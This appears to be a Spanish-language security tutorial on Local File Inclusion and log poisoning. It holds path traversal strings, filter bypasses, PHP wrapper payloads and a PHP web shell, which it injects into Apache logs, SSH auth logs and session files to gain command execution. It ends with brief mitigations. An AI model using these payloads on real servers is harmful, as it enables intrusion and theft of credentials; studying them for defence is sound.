# 📁 Local File Inclusion (LFI) y Log Poisoning

## Local File Inclusion (LFI)

LFI es una vulnerabilidad que permite al atacante hacer que el servidor incluya y procese un archivo arbitrario del sistema de archivos local. Se produce cuando la aplicación usa input del usuario para construir la ruta de un archivo sin validarla adecuadamente.

---

### Detección básica

Si una aplicación carga contenido dinámico así:
```
http://target.com/index.php?page=about
```

Probar:
```
http://target.com/index.php?page=../../../etc/passwd
```

Si el servidor devuelve el contenido de `/etc/passwd`, hay una vulnerabilidad LFI.

---

### Path Traversal

La técnica más directa: navegar por el sistema de archivos con `../`:

```
# Linux
?page=../../../etc/passwd
?page=../../../etc/shadow
?page=../../../etc/hosts
?page=../../../proc/self/environ

# Windows
?page=..\..\..\windows\system32\drivers\etc\hosts
?page=..\..\..\windows\win.ini
```

Si la aplicación filtra `../`, intentar:
```
# URL encoding
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Doble encoding
?page=%252e%252e%252fetc%252fpasswd

# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

# Mezcla de separadores
?page=....//....//etc/passwd
?page=..\/..\/etc/passwd
```

---

### PHP Wrappers

PHP ofrece wrappers que amplían lo que se puede hacer con LFI:

**Leer código fuente PHP en Base64** (evita que se ejecute):
```
?page=php://filter/convert.base64-encode/resource=index.php
```
Decodificar la respuesta:
```bash
echo "PD9waHAgc3lzdGVtK..." | base64 -d
```

**Ejecutar código PHP desde la URL** (requiere `allow_url_include=On`):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```
El payload decodificado es `<?php system($_GET['cmd']); ?>`.

**Wrapper expect** (ejecución directa si está habilitado):
```
?page=expect://id
```

---

### Archivos útiles para leer en LFI

| Ruta | Contenido |
|---|---|
| `/etc/passwd` | Usuarios del sistema |
| `/etc/shadow` | Hashes de contraseñas (requiere root) |
| `/etc/hosts` | Resolución de nombres local |
| `/etc/ssh/sshd_config` | Configuración SSH |
| `/proc/self/environ` | Variables de entorno del proceso web |
| `/proc/self/cmdline` | Línea de comandos del proceso |
| `/var/www/html/config.php` | Credenciales de base de datos |
| `C:\xampp\htdocs\config.php` | Configuración en Windows |
| `C:\Windows\win.ini` | Archivo de configuración Windows |

---

## Log Poisoning

Log Poisoning combina LFI con la capacidad de escribir en archivos de log. El objetivo es inyectar código PHP en un log del servidor y luego incluirlo via LFI para conseguir **Remote Code Execution (RCE)**.

---

### Apache — access.log

Los logs de Apache registran el `User-Agent` de cada petición en texto plano. Si se puede leer `/var/log/apache2/access.log` via LFI, se puede inyectar código PHP en él.

**Paso 1:** Inyectar el payload en el User-Agent:
```bash
curl -s -X GET "http://target.com/page" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

**Paso 2:** Incluir el log via LFI y ejecutar comandos:
```
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
```

Rutas habituales de logs:
- Linux: `/var/log/apache2/access.log`
- Windows: `C:\xampp\apache\logs\access.log`

---

### Nginx — access.log

Mismo concepto. Rutas:
- Linux: `/var/log/nginx/access.log`
- Windows: `C:\nginx\log\access.log`

---

### SSH — auth.log

Los intentos de login SSH quedan registrados con el nombre de usuario usado. Si el nombre de usuario contiene código PHP, se inyecta en el log.

**Inyección via SSH:**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@<IP_VICTIMA>
```

**Inyección via Python (más controlada):**
```python
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect("172.17.0.2", username='<?php system($_GET["cmd"]); ?>', password="wrong")
except:
    pass
```

**Paso 2:** Incluir el log e interactuar:
```
http://target.com/index.php?page=/var/log/auth.log&cmd=id
```

> En sistemas Red Hat/CentOS el log puede estar en `/var/log/btmp` en lugar de `auth.log`.

---

### PHP Session Poisoning

Las sesiones PHP se almacenan como archivos en el servidor y pueden contener datos que controlamos.

**Paso 1:** Verificar el valor de la cookie `PHPSESSID` (ej. `abc123def456`).

**Paso 2:** Incluir el archivo de sesión via LFI para ver qué parámetros son controlables:
```
?page=/var/lib/php/sessions/sess_abc123def456
```

**Paso 3:** Si uno de los parámetros del archivo de sesión refleja un valor que controlamos (ej. el parámetro `page`), inyectar el payload:
```
?page=<?php system($_GET['cmd']); ?>
```

**Paso 4:** Incluir el archivo de sesión con el comando:
```
?page=/var/lib/php/sessions/sess_abc123def456&cmd=id
```

> Rutas de sesiones: Linux → `/var/lib/php/sessions/` · Windows → `C:\Windows\Temp\`

---

### Tabla de funciones PHP vulnerables a LFI/RFI

| Función | Lee | Ejecuta | URL remota |
|---|:---:|:---:|:---:|
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ✅ |

---

## Mitigaciones

- No construir rutas de archivo con input del usuario sin validación estricta
- Usar listas blancas de archivos permitidos
- Deshabilitar wrappers peligrosos: `allow_url_include = Off` y `allow_url_fopen = Off`
- Ejecutar el servidor web con mínimos privilegios (sin acceso a `/etc/shadow`, etc.)
- Almacenar logs fuera del directorio web y con permisos restrictivos
